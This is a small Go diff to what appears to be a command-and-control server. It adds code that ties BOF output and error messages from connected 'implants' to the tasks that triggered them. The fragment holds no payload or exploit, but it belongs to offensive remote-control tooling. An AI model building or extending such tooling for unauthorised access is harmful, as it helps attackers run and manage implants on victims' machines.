@@ -127,6 +127,10 @@ func (s *Session) readLoop() {
 		// Map wire type -> event type, publish to subscribers.
 		et := m.Type // "hello" | "output" | "error"
 		s.bus.Publish(Event{Type: et, ImplantID: s.ID, Data: m.Data})
+		// Correlate BOF output/error to the task that triggered it.
+		if et == "output" || et == "error" {
+			tasks.Feed(s.ID, et, m.Data)
+		}
 		switch m.Type {
 		case "hello":
 			fmt.Fprintf(logf(), "[core] implant %s hello: %s\n", s, m.Data)
